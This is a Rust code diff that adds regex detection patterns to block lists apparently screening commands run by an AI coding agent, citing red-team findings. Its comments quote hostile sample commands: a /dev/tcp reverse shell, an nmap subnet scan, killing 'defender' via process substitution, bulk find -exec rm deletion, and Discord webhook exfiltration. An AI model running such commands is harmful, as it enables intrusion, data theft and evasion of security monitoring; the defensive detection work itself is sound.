@@ -207,6 +207,18 @@ pub(crate) static DANGEROUS_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)
                 Regex::new(r"\bnsenter\s+[^|\n]*(-t|--target)\s*1\b").expect("Invalid regex"),
                 "nsenter into host namespaces (container escape)",
             ),
+            // Network scanners (wave-32: `nmap -sV 192.168.1.0/24`) —
+            // active network reconnaissance, never coding work.
+            (
+                Regex::new(r"\b(nmap|masscan)\s").expect("Invalid regex"),
+                "network scanner (reconnaissance)",
+            ),
+            // Discord webhook URLs (wave-32) — same exfil-sink class as
+            // the Slack webhook block above.
+            (
+                Regex::new(r"discord(app)?\.com/api/webhooks/").expect("Invalid regex"),
+                "discord webhook URL in command (exfil sink)",
+            ),
             // `find … -exec rm/shred/dd` — bulk destruction with no literal
             // rm target for the classic patterns to see (wave-9 finding:
             // `find / -type d -name '*.sql' -exec rm {} \`).
@@ -280,7 +292,7 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             // transport (`sh -i >& /dev/tcp/host/4444 0>&1`), usually hidden
             // inside quotes where the masked table cannot see it.
             (
-                Regex::new(r">\s*/dev/tcp/").expect("Invalid regex"),
+                Regex::new(r">[&\d]*\s*/dev/tcp/").expect("Invalid regex"),
                 "reverse shell (/dev/tcp channel)",
             ),
             // Pipe-to-shell downloads nested INSIDE quotes — the masked
@@ -484,6 +496,18 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             (
                 Regex::new(r"core\.hookspath").expect("Invalid regex"),
                 "git core.hooksPath redirect (hook execution)",
+            ),
+            // Killing security tooling via substitution (wave-32: `kill -9
+            // $(ps aux | grep 'defender' | awk '{print $2}')`) — the
+            // killall/pkill DANGEROUS-list forms are covered; the
+            // substitution form hides the target inside quotes, so it lives
+            // here in PAYLOAD (matched against the restored form).
+            (
+                Regex::new(
+                    r"\bkill\s+[^|\n]*\$\([^)]*(defender|monitoring|auditd|osquery|falco|sysmon|watchdog|sshd)",
+                )
+                .expect("Invalid regex"),
+                "kill security tooling via substitution (defense evasion)",
             ),
             // Exfiltration channels (red-team wave-3 finding): local
             // sensitive data shipped to a remote endpoint from a shell
